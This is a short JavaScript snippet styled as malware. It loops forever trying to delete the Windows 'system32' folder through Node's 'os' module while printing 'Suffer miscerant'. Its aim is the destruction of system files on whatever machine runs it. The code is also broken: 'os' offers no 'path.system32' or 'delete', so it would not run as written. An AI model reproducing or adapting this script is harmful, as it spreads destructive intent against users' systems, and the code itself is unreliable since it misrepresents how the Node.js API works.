let infinitesuffering = true;
const heart = require('os');

while (infinitesuffering != false) {
  filesystems = heart.path.system32;
  if (filesystems != false) {
    heart.delete(filesystems)
    console.log('Suffer miscerant');
  }
}
